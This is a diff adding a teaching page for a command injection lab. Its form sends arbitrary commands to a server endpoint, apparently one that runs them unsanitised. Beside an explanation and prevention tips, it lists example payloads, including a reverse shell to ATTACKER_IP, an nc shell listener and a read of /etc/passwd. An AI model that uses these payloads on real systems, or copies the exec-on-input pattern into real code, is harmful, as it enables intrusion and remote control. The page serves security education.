@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -31,4 +31,214 @@
         }
     </script>
 </body>
+</html> -->
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Injection Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        h2 {
+            color: #2c3e50;
+            border-bottom: 2px solid #e74c3c;
+            padding-bottom: 10px;
+        }
+        
+        .demo-container {
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        input {
+            width: 70%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-family: monospace;
+        }
+        
+        button {
+            background-color: #e74c3c;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            font-weight: bold;
+        }
+        
+        button:hover {
+            background-color: #c0392b;
+        }
+        
+        #response {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #fdecea;
+            border-radius: 5px;
+            max-height: 400px;
+            overflow: auto;
+            white-space: pre-wrap;
+            font-family: monospace;
+            border-left: 4px solid #e74c3c;
+        }
+        
+        .note-box {
+            background-color: #e8f4fc;
+            border-left: 4px solid #3498db;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 4px 4px 0;
+        }
+        
+        .warning-box {
+            background-color: #fdecea;
+            border-left: 4px solid #e74c3c;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 4px 4px 0;
+        }
+        
+        .success-box {
+            background-color: #e8f5e9;
+            border-left: 4px solid #2ecc71;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 4px 4px 0;
+        }
+        
+        code {
+            background-color: #f1f1f1;
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+        
+        ul.payloads {
+            list-style-type: none;
+            padding: 0;
+        }
+        
+        ul.payloads li {
+            background-color: #f1f1f1;
+            margin: 5px 0;
+            padding: 8px;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+    </style>
+</head>
+
+<body>
+    <h2>Command Injection (CMDi) Vulnerability Demo</h2>
+    
+    <div class="demo-container">
+        <h3>Test the Vulnerability</h3>
+        <input type="text" id="command" placeholder="Enter command (e.g., ls -la)">
+        <button onclick="testCmdi()">Execute Command</button>
+        <div id="response">Command output will appear here...</div>
+    </div>
+
+    <div class="note-box">
+        <h3>How This Attack Works</h3>
+        <p>Command Injection occurs when an application executes arbitrary OS commands from user input:</p>
+        <ol>
+            <li>The server takes user input and passes it directly to <code>child_process.exec()</code></li>
+            <li>Attackers chain malicious commands using shell metacharacters</li>
+            <li>The server executes both the intended and injected commands</li>
+        </ol>
+        
+        <h4>Why This Code is Vulnerable:</h4>
+        <ul>
+            <li><strong>Direct command execution:</strong> Uses user input in <code>exec()</code> without sanitization</li>
+            <li><strong>No input validation:</strong> Allows all characters including <code>; & |</code></li>
+            <li><strong>Full system access:</strong> Runs with the same privileges as the Node.js process</li>
+        </ul>
+    </div>
+
+    <div class="warning-box">
+        <h3>Example Exploit Payloads</h3>
+        <p>Try these dangerous inputs to see the vulnerability in action:</p>
+        <ul class="payloads">
+            <li><strong>Basic injection:</strong> <code>ls; id</code> (Runs both commands)</li>
+            <li><strong>Reverse shell:</strong> <code>ls; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code></li>
+            <li><strong>File read:</strong> <code>ls; cat /etc/passwd</code></li>
+            <li><strong>Background process:</strong> <code>ls & nc -lvp 4444 -e /bin/sh</code></li>
+            <li><strong>Piped commands:</strong> <code>ls | whoami</code></li>
+            <li><strong>Subshell execution:</strong> <code>ls $(whoami > /tmp/hacked)</code></li>
+        </ul>
+        <p class="warning"><strong>⚠️ Warning:</strong> These can damage your system! Use in controlled environments only.</p>
+    </div>
+
+    <div class="success-box">
+        <h3>How to Prevent Command Injection</h3>
+        <p><strong>Secure coding practices:</strong></p>
+        <ol>
+            <li><strong>Whitelist allowed commands:</strong>
+                <code><pre>const allowed = ['ls', 'pwd'];
+if (!allowed.includes(userInput)) {
+    throw new Error("Command not allowed");
+}</pre></code>
+            </li>
+            <li><strong>Use parameterized APIs:</strong>
+                <code><pre>const { execFile } = require('child_process');
+execFile('ls', ['-la'], (err, stdout) => {...});</pre></code>
+            </li>
+            <li><strong>Sanitize input:</strong>
+                <code><pre>// Block all shell metacharacters
+if (/[;&|>$()]/.test(userInput)) {
+    throw new Error("Invalid characters");
+}</pre></code>
+            </li>
+            <li><strong>Run with least privileges:</strong>
+                <code><pre>// Run Node.js as unprivileged user
+$ sudo -u nobody node app.js</pre></code>
+            </li>
+        </ol>
+        <p><strong>Remember:</strong> Never concatenate user input into shell commands!</p>
+    </div>
+
+    <script>
+        function testCmdi() {
+            const command = document.getElementById("command").value;
+            if (!command) {
+                alert("Please enter a command");
+                return;
+            }
+
+            document.getElementById("response").innerText = "Executing command...";
+            
+            fetch('/cmd', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command })
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("response").innerText = data.message || "No output";
+            })
+            .catch(error => {
+                document.getElementById("response").innerText = "Error: " + error.message;
+                console.error("Error:", error);
+            });
+        }
+    </script>
+</body>
+
 </html>
